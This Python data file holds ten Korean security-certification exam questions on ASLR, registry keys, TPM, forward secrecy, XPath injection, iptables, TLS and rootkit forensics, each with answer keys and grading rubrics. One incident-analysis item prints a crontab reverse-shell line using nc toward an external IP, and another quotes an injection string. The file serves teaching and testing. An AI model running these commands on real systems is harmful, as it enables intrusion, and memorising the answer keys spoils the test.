# -*- coding: utf-8 -*-
"""
Batch 3 - Chunk 2: SRC-12 Comprehensive Summary (10 questions)
Q-SHORT-094 ~ Q-SHORT-100 (7 short)
Q-DESC-038 ~ Q-DESC-039 (2 desc)
Q-PRAC-021 (1 prac)
"""

CHUNK_2_QUESTIONS = [
    {
        "id": "Q-SHORT-094",
        "type": "short",
        "category": "시스템 보안",
        "score": 3,
        "question": "리눅스 커널에서 버퍼 오버플로우 공격을 방어하기 위해 프로세스의 스택(Stack), 힙(Heap), 공유 라이브러리 메모리 주소를 실행 시마다 무작위로 배치하는 ASLR(Address Space Layout Randomization) 보호 기법의 활성화 상태를 제어하는 proc 가상 파일시스템 경로 파라미터의 명칭을 쓰시오.",
        "answer": "randomize_va_space",
        "accepted_answers": [
            "randomize_va_space",
            "/proc/sys/kernel/randomize_va_space",
            "kernel.randomize_va_space"
        ],
        "grading_mode": "strict",
        "explanation": "/proc/sys/kernel/randomize_va_space는 리눅스 ASLR 설정 파라미터로 0은 비활성화, 1은 보수적 난수화, 2는 전체 난수화(스택, 힙 등)를 의미합니다 (SRC-12 p.24).",
        "source_id": "SRC-12",
        "source_page": 24,
        "concept_id": "CON-SYS-03",
        "difficulty": "medium",
        "tags": ["ASLR", "randomize_va_space", "리눅스보안", "메모리보호", "버퍼오버플로우"]
    },
    {
        "id": "Q-SHORT-095",
        "type": "short",
        "category": "시스템 보안",
        "score": 3,
        "question": "마이크로소프트 윈도우 운영체제의 레지스트리(Registry)에서 컴퓨터에 설치된 하드웨어 장치 설정, 운영체제 구성 정보 및 설치된 모든 소프트웨어의 시스템 전역 환경설정을 보관하는 최상위 루트키의 영문 약어를 쓰시오.",
        "answer": "HKLM",
        "accepted_answers": ["HKLM", "HKEY_LOCAL_MACHINE", "HKEY LOCAL MACHINE"],
        "grading_mode": "normalized",
        "explanation": "HKLM(HKEY_LOCAL_MACHINE)은 윈도우 레지스트리에서 하드웨어 및 소프트웨어의 시스템 전역 설정을 보관하는 최상위 루트키입니다 (SRC-12 p.7).",
        "source_id": "SRC-12",
        "source_page": 7,
        "concept_id": "CON-SYS-01",
        "difficulty": "easy",
        "tags": ["윈도우", "레지스트리", "HKLM", "HKEY_LOCAL_MACHINE", "시스템보안"]
    },
    {
        "id": "Q-SHORT-096",
        "type": "short",
        "category": "시스템 보안",
        "score": 3,
        "question": "컴퓨터 메인보드에 탑재되는 물리적 하드웨어 보안 칩셋으로서, 암호화 키 생성 및 안전한 저장, 단계적 무결성 검증 부팅(Measured/Authenticated Boot), 기기 설정 상태에 대한 원격 증명(Attestation)을 제공하는 신뢰 플랫폼 모듈의 영문 약어를 쓰시오.",
        "answer": "TPM",
        "accepted_answers": ["TPM", "Trusted Platform Module", "신뢰 플랫폼 모듈"],
        "grading_mode": "normalized",
        "explanation": "TPM(Trusted Platform Module; 신뢰 플랫폼 모듈)은 하드웨어 기반으로 암호키 저장, 인증된 부트 서비스, 무결성 증명을 지원하는 보안 칩입니다 (SRC-12 p.27).",
        "source_id": "SRC-12",
        "source_page": 27,
        "concept_id": "CON-SYS-01",
        "difficulty": "medium",
        "tags": ["TPM", "TrustedPlatformModule", "신뢰플랫폼모듈", "보안칩", "하드웨어보안"]
    },
    {
        "id": "Q-SHORT-097",
        "type": "short",
        "category": "정보보안 일반 및 암호학",
        "score": 3,
        "question": "SSL/TLS 등 보안 통신에서 향후 서버의 장기 개인키(비밀키)가 공격자에게 탈취되거나 노출되더라도, 이전에 수립되어 교환되었던 세션 키와 통신 암호문 트래픽의 기밀성을 해독할 수 없도록 보장하는 암호학적 특성을 의미하는 영문 약어를 쓰시오.",
        "answer": "PFS",
        "accepted_answers": ["PFS", "Perfect Forward Secrecy", "완전 순방향 비밀성", "완전 전방향 비밀성", "순방향 비밀성", "전방향 비밀성"],
        "grading_mode": "normalized",
        "explanation": "PFS(Perfect Forward Secrecy; 완전 순방향 비밀성)는 장기 비밀키가 노출되어도 과거 세션의 기밀성이 유지되는 성질로, DHE나 ECDHE 키 교환을 통해 제공됩니다 (SRC-12 p.53).",
        "source_id": "SRC-12",
        "source_page": 53,
        "concept_id": "CON-CRY-01",
        "difficulty": "medium",
        "tags": ["PFS", "PerfectForwardSecrecy", "순방향비밀성", "TLS", "암호학"]
    },
    {
        "id": "Q-SHORT-098",
        "type": "short",
        "category": "애플리케이션 보안",
        "score": 3,
        "question": "XML 기반 데이터베이스 및 문서를 조회하는 웹 애플리케이션에서 사용자 입력값에 대한 검증 미흡을 악용하여, 공격자가 악의적인 XML 경로 질의 구문(예: `' or '1'='1`)을 삽입함으로써 인증을 우회하거나 비인가된 XML 데이터 구조를 열람하는 웹 취약점 공격 기법을 쓰시오.",
        "answer": "XPath 인젝션",
        "accepted_answers": [
            "XPath 인젝션",
            "XPath Injection",
            "XPath",
            "Xpath",
            "Xpath 인젝션",
            "Xpath Injection",
            "XPath 삽입",
            "XPath삽입",
            "XPath인젝션",
            "XPath/XQuery Injection"
        ],
        "grading_mode": "normalized",
        "explanation": "XPath 인젝션(XPath Injection)은 XML 데이터베이스 질의 언어인 XPath 문법 구조를 조작하여 인증을 우회하고 데이터를 추출하는 취약점 공격입니다 (SRC-12 p.76).",
        "source_id": "SRC-12",
        "source_page": 76,
        "concept_id": "CON-APP-01",
        "difficulty": "medium",
        "tags": ["XPath", "XPath인젝션", "XPathInjection", "웹취약점", "XML보안"]
    },
    {
        "id": "Q-SHORT-099",
        "type": "short",
        "category": "네트워크 보안",
        "score": 3,
        "question": "리눅스 iptables 방화벽 규칙에서 규칙에 매칭된 패킷을 차단할 때, 아무런 응답을 주지 않고 폐기하는 DROP 정책과 달리 송신 측 호스트에게 ICMP Destination Unreachable 오류 메시지 또는 TCP RST 패킷을 명시적으로 반환하여 연결 거부를 알리는 타깃(Target)의 명칭을 쓰시오.",
        "answer": "REJECT",
        "accepted_answers": ["REJECT", "reject"],
        "grading_mode": "strict",
        "explanation": "REJECT 정책은 패킷을 차단하면서 송신자에게 오류 응답(ICMP unreachable 또는 TCP RST)을 명시적으로 전송하여 불필요한 타임아웃 대기를 방지합니다 (SRC-12 p.42).",
        "source_id": "SRC-12",
        "source_page": 42,
        "concept_id": "CON-NET-04",
        "difficulty": "easy",
        "tags": ["iptables", "REJECT", "방화벽", "패킷필터링", "네트워크보안"]
    },
    {
        "id": "Q-SHORT-100",
        "type": "short",
        "category": "애플리케이션 보안",
        "score": 3,
        "question": "악성코드 유포 및 웹 공격자가 보안 솔루션의 시그니처 기반 탐지 및 분석가의 역공학을 방해하기 위해, 악성 자바스크립트나 쉘코드 등의 코드를 다수의 작은 문자열 변수로 잘게 쪼갠 후 실행 시점에 재조합하여 출력하는 악성코드 난독화 기법의 명칭을 쓰시오.",
        "answer": "분할 난독화",
        "accepted_answers": ["분할 난독화", "분할난독화", "문자열 분할 난독화"],
        "grading_mode": "normalized",
        "explanation": "분할 난독화는 악성코드를 다수의 문자열 변수로 잘게 쪼갠 후 재조합하여 출력하는 난독화 분류 방식입니다 (SRC-12 p.102).",
        "source_id": "SRC-12",
        "source_page": 102,
        "concept_id": "CON-APP-04",
        "difficulty": "medium",
        "tags": ["난독화", "분할난독화", "악성코드", "역공학방지", "시큐어코딩"]
    },
    {
        "id": "Q-DESC-038",
        "type": "descriptive",
        "category": "네트워크 보안",
        "score": 12,
        "question": "SSL/TLS 1.2 프로토콜에서 클라이언트와 웹 서버 간 안전한 암호화 통신 채널을 수립하기 위해 수행되는 완전 핸드셰이크(Full Handshake) 과정에 대하여 다음 물음에 답하시오.\n\n1) 핸드셰이크 1단계에서 클라이언트가 서버로 전송하는 `Client Hello` 메시지에 포함되는 주요 정보 3가지를 서술하시오. (4점)\n2) 핸드셰이크 과정 중 `Server Key Exchange` 메시지가 반드시 전송되어야 하는 경우와 그 목적을 서술하시오. (4점)\n3) 핸드셰이크 최종 단계에서 송수신되는 `Change Cipher Spec` 메시지와 `Finished` 메시지의 기술적 의미와 역할을 각각 서술하시오. (4점)",
        "model_answer": "1) Client Hello 포함 정보: 클라이언트가 지원하는 TLS 프로토콜 최고 버전, 클라이언트가 생성한 32바이트 난수(Client Random), 클라이언트가 지원하는 암호 알고리즘 목록(Cipher Suites), 지원하는 압축 방식(Compression Methods), 세션 ID(Session ID)\n2) Server Key Exchange 전송 이유 및 목적: 서버 인증서(Certificate)에 포함된 공개키 정보만으로 클라이언트와 세션 키(Pre-master secret)를 안전하게 교환하기에 정보가 부족한 경우 전송된다. 구체적으로 DHE(Diffie-Hellman Ephemeral)나 ECDHE 등 임시 키 교환 알고리즘을 사용하여 완전 순방향 비밀성(PFS)을 제공할 때, 서버가 생성한 임시 공개키 매개변수와 이에 대한 디지털 서명을 클라이언트에 전달하기 위해 사용된다.\n3) Change Cipher Spec 및 Finished 역할:\n- Change Cipher Spec: 협상된 암호 스위트와 세션 키를 '이후에 전송되는 모든 패킷부터 실제로 적용하여 암호화 통신을 시작한다'는 전환 사실을 상대방에게 알리는 제어 메시지이다.\n- Finished: 핸드셰이크 과정 전체에서 교환된 모든 메시지의 해시값을 계산하여 최초로 암호화하여 전송함으로써, 양단 간 핸드셰이크 협상이 무결하게 성공적으로 완료되었음을 검증하는 메시지이다.",
        "sub_questions": [
            {
                "sub_id": 1,
                "score": 4,
                "prompt": "1) Client Hello 메시지에 포함되는 주요 정보 3가지",
                "model_answer": "클라이언트 난수(Client Random), 지원 TLS 버전, 지원 암호 스위트(Cipher Suites), 세션 ID",
                "rubric": {
                    "keywords": [
                        ["난수", "client random", "랜덤"],
                        ["암호", "cipher", "암호 스위트", "알고리즘 목록"],
                        ["버전", "tls 버전", "프로토콜 버전", "세션 id", "세션"]
                    ],
                    "all_match_points": 4,
                    "partial_match_points": 2
                }
            },
            {
                "sub_id": 2,
                "score": 4,
                "prompt": "2) Server Key Exchange 메시지의 전송 조건 및 목적",
                "model_answer": "DHE/ECDHE 등 임시 키 교환 시 서버의 임시 공개키 매개변수와 전자서명을 전달하여 완전 순방향 비밀성(PFS)을 제공하기 위해 전송된다.",
                "rubric": {
                    "keywords": [
                        ["dhe", "ecdhe", "디피 헬만", "임시 키", "키 교환"],
                        ["매개변수", "파라미터", "서명", "pfs", "공개키"]
                    ],
                    "all_match_points": 4,
                    "partial_match_points": 2
                }
            },
            {
                "sub_id": 3,
                "score": 4,
                "prompt": "3) Change Cipher Spec 및 Finished 메시지의 기술적 의미와 역할",
                "model_answer": "Change Cipher Spec은 협상된 암호 명세를 이후부터 적용함을 알리며, Finished는 핸드셰이크 완료 및 무결성을 암호화 검증한다.",
                "rubric": {
                    "keywords": [
                        ["적용", "암호 명세", "전환", "이후부터"],
                        ["finished", "완료", "협상 완료", "검증", "무결성"]
                    ],
                    "all_match_points": 4,
                    "partial_match_points": 2
                }
            }
        ],
        "explanation": "SSL/TLS 1.2 Handshake는 Client/Server Hello, 키 교환, Change Cipher Spec, Finished 단계를 거쳐 보안 채널을 형성합니다 (SRC-12 p.53, 54).",
        "source_id": "SRC-12",
        "source_page": 54,
        "concept_id": "CON-NET-03",
        "difficulty": "hard",
        "tags": ["SSL", "TLS", "Handshake", "ChangeCipherSpec", "Finished", "ServerKeyExchange"]
    },
    {
        "id": "Q-DESC-039",
        "type": "descriptive",
        "category": "애플리케이션 보안",
        "score": 12,
        "question": "다음은 보안 관리자가 메일 서버에서 수신한 정상적인 이메일의 헤더 정보 중 일부이다. [Received 헤더 정보]를 분석하고 각 물음에 답하시오.\n\n[Received 헤더 정보]\nReceived: from mail.company.com (mail.company.com [198.51.100.10])\n    by mx.receiver.com (Postfix) with ESMTPS id 4S9XYZ\n    for <user@receiver.com>; Wed, 15 Jan 2025 14:20:00 +0900 (KST)\n    (using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))\n\n1) 이메일 헤더에서 `Received` 필드가 가지는 보안 분석 및 침해사고 조사 관점에서의 핵심 용도를 서술하시오. (3점)\n2) 전송 구간 암호화에 사용된 암호 스위트 `ECDHE-RSA-AES128-GCM-SHA256`의 각 구성요소가 담당하는 보안 알고리즘 역할을 각각 쓰시오. (5점)\n   - ECDHE / RSA / AES128 / GCM / SHA256\n3) 암호 스위트에서 단순 RSA 키 교환 대신 `ECDHE`를 키 교환 알고리즘으로 사용할 때 얻을 수 있는 대표적인 암호학적 보안상 이점을 서술하시오. (4점)",
        "model_answer": "1) Received 필드의 핵심 용도: 실제 이메일이 발신지로부터 수신지 메일 서버에 도달하기까지 경유한 모든 메일 전송 에이전트(MTA)의 호스트명, IP 주소, 처리 시각, 전송 프로토콜 등의 경로 기록을 담고 있어, 발신자 위조 여부 판별 및 발신 근원지를 역추적하는 핵심 포렌식 증거로 사용된다.\n2) 암호 스위트 구성요소 역할:\n- ECDHE: 타원곡선 디피-헬만 에페머럴 기반의 안전한 세션 키 교환 알고리즘\n- RSA: 서버의 신원을 확인하고 디지털 인증서 및 키 교환 매개변수를 검증하는 인증/서명 알고리즘\n- AES128: 128비트 대칭키 기반의 메시지 본문 데이터 기밀성 암호화 알고리즘\n- GCM: Galois/Counter Mode 기반의 대칭키 블록암호 운용모드로 기밀성과 인증(무결성)을 동시 제공하는 AEAD 모드\n- SHA256: 메시지 인증 코드(MAC) 및 무결성 검증을 위한 256비트 암호학적 해시 알고리즘\n3) ECDHE 사용의 암호학적 이점: 완전 순방향 비밀성(PFS; Perfect Forward Secrecy)을 제공하여, 향후 메일 서버의 RSA 장기 개인키가 해킹 등으로 유출되더라도 과거에 녹음/수집된 암호화 이메일 트래픽의 세션 키를 역산할 수 없어 통신 내용을 복호화할 수 없도록 영구히 보호한다.",
        "sub_questions": [
            {
                "sub_id": 1,
                "score": 3,
                "prompt": "1) 이메일 Received 필드의 보안 분석 및 조사 관점에서의 핵심 용도",
                "model_answer": "이메일이 경유한 서버 경로, IP, 시각을 기록하여 발신 근원지를 역추적하고 위조 여부를 판별한다.",
                "rubric": {
                    "keywords": [
                        ["경유", "경로", "전송 경로"],
                        ["역추적", "근원지", "발신지", "위조", "포렌식"]
                    ],
                    "all_match_points": 3,
                    "partial_match_points": 1.5
                }
            },
            {
                "sub_id": 2,
                "score": 5,
                "prompt": "2) 암호 스위트 ECDHE, RSA, AES128, GCM, SHA256의 각 역할",
                "model_answer": "ECDHE(키 교환), RSA(인증/서명), AES128(대칭키 암호화), GCM(블록암호 운용모드/AEAD), SHA256(메시지 인증/해시)",
                "rubric": {
                    "keywords": [
                        ["키 교환", "ecdhe"],
                        ["인증", "서명", "rsa"],
                        ["대칭키", "암호화", "aes"],
                        ["운용모드", "gcm", "블록암호"],
                        ["해시", "무결성", "mac", "sha"]
                    ],
                    "all_match_points": 5,
                    "partial_match_points": 2.5
                }
            },
            {
                "sub_id": 3,
                "score": 4,
                "prompt": "3) ECDHE 채택 시 얻을 수 있는 암호학적 보안상 이점",
                "model_answer": "완전 순방향 비밀성(PFS)을 제공하여 서버 개인키가 노출되어도 과거 암호화 트래픽 복호화를 방지한다.",
                "rubric": {
                    "keywords": [
                        ["pfs", "완전 순방향 비밀성", "순방향 비밀성", "forward secrecy"],
                        ["개인키", "비밀키", "복호화", "과거", "탈취"]
                    ],
                    "all_match_points": 4,
                    "partial_match_points": 2
                }
            }
        ],
        "explanation": "이메일 Received 헤더는 전송 경로를 추적하는 핵심 정보이며, ECDHE-RSA-AES128-GCM-SHA256 암호 스위트는 PFS와 강력한 기밀성/무결성을 보장합니다 (SRC-12 p.66).",
        "source_id": "SRC-12",
        "source_page": 66,
        "concept_id": "CON-APP-02",
        "difficulty": "hard",
        "tags": ["메일보안", "Received헤더", "암호스위트", "ECDHE", "PFS", "GCM"]
    },
    {
        "id": "Q-PRAC-021",
        "type": "practical",
        "category": "시스템 보안",
        "score": 16,
        "question": "다음은 리눅스 웹 서버 침해사고 조사 과정에서 보안 관리자가 실행한 명령어와 출력 결과이다. 내용을 분석하고 각 질문에 답하시오.\n\n[무결성 검사 명령어 및 출력]\n# rpm -V net-tools procps\nS.5....T.  c /bin/netstat\nS.5....T.  c /bin/ps\n\n[패키지 재설치 시도 및 오류]\n# rpm -Uvh --force /media/cdrom/Packages/procps-3.2.8.rpm\nerror: can't create /bin/ps: Permission denied\n\n[속성 조회 결과]\n# lsattr /bin/netstat /bin/ps\n----i--------e- /bin/netstat\n----i--------e- /bin/ps\n\n[스케줄러 설정 확인]\n# cat /etc/crontab\n0 3 * * * root /usr/bin/nc 203.0.113.50 4444 -e /bin/bash\n\n1) `rpm -V` 명령 결과에서 확인된 무결성 변조 플래그 `S`, `5`, `T`가 나타내는 기술적 의미를 각각 쓰시오. (6점)\n2) 관리자가 `rpm -Uvh --force`로 정상 패키지를 재설치하려 했으나 `Permission denied` 오류가 발생한 원인을 `lsattr` 출력 결과를 바탕으로 서술하고, 패키지 정상 재설치를 위해 선행되어야 하는 리눅스 명령어 구문을 쓰시오. (5점)\n3) `/etc/crontab`에 등록된 작업의 보안 위협 성격을 규명하고, 공격자가 해당 서버를 주기적으로 장악하기 위해 사용한 침해 기술의 명칭을 쓰시오. (5점)",
        "model_answer": "1) rpm -V 변조 플래그 의미:\n- S (Size): 파일의 크기가 설치 초기 상태와 다르게 변경됨\n- 5 (MD5): 파일의 MD5 체크섬(해시값)이 변경되어 내용이 변조됨\n- T (mTime): 파일의 최종 수정 시간(Modification Time)이 변경됨\n2) 재설치 오류 원인 및 해결 명령:\n- 원인: 루트킷 백도어를 설치한 공격자가 파일의 변조 방지 및 관리자의 삭제·덮어쓰기를 방어하기 위해 `/bin/ps`와 `/bin/netstat` 파일에 `chattr +i`(불변, Immutable) 속성을 설정하였기 때문에 root 사용자라도 수정 및 덮어쓰기가 거부된다.\n- 해결 명령: `chattr -i /bin/netstat /bin/ps` 명령을 실행하여 immutable 속성을 제거한 후 재설치한다.\n3) crontab 보안 위협 및 침해 기술:\n- 보안 위협: 매일 새벽 3시에 넷캣(`nc`)을 실행하여 공격자 C&C 서버(203.0.113.50:4444)로 시스템 root 권한의 Bash 쉘을 자동 연결하는 백도어 행위\n- 침해 기술: 리버스 쉘 (Reverse Shell) 백도어 및 루트킷(Rootkit) 은닉 공격",
        "sub_questions": [
            {
                "sub_id": 1,
                "score": 6,
                "prompt": "1) rpm -V 무결성 플래그 S, 5, T의 기술적 의미",
                "model_answer": "S는 파일 크기 변경, 5는 MD5 체크섬 변경, T는 파일 수정 시간 변경을 의미한다.",
                "rubric": {
                    "keywords": [
                        ["크기", "파일 크기", "size"],
                        ["md5", "체크섬", "해시"],
                        ["수정 시간", "mtime", "시간 변경"]
                    ],
                    "all_match_points": 6,
                    "partial_match_points": 3
                }
            },
            {
                "sub_id": 2,
                "score": 5,
                "prompt": "2) 패키지 재설치 거부 원인 및 immutable 속성 해제 명령어",
                "model_answer": "파일에 불변(i, immutable) 속성이 부여되어 변경이 거부되었으므로, `chattr -i /bin/netstat /bin/ps` 명령으로 속성을 제거해야 한다.",
                "rubric": {
                    "keywords": [
                        ["i 속성", "immutable", "불변 속성", "chattr"],
                        ["chattr -i", "chattr -i /bin/netstat /bin/ps"]
                    ],
                    "all_match_points": 5,
                    "partial_match_points": 2.5
                }
            },
            {
                "sub_id": 3,
                "score": 5,
                "prompt": "3) crontab 등록 작업의 성격 및 침해 기술 명칭",
                "model_answer": "외부 공격자 서버로 쉘을 연결하는 리버스 쉘(Reverse Shell) 백도어 작업이다.",
                "rubric": {
                    "keywords": [
                        ["리버스 쉘", "reverse shell", "리버스쉘"],
                        ["백도어", "루트킷", "rootkit", "nc", "bash"]
                    ],
                    "all_match_points": 5,
                    "partial_match_points": 2.5
                }
            }
        ],
        "explanation": "루트킷에 의해 변조된 파일은 rpm -V로 탐지하고, chattr -i로 immutable 속성을 해제한 후 재설치하며, crontab의 nc 명령은 리버스 쉘 백도어입니다 (SRC-12 p.104).",
        "source_id": "SRC-12",
        "source_page": 104,
        "concept_id": "CON-SYS-02",
        "difficulty": "hard",
        "tags": ["rpm", "chattr", "lsattr", "루트킷", "리버스쉘", "침해사고분석"]
    }
]
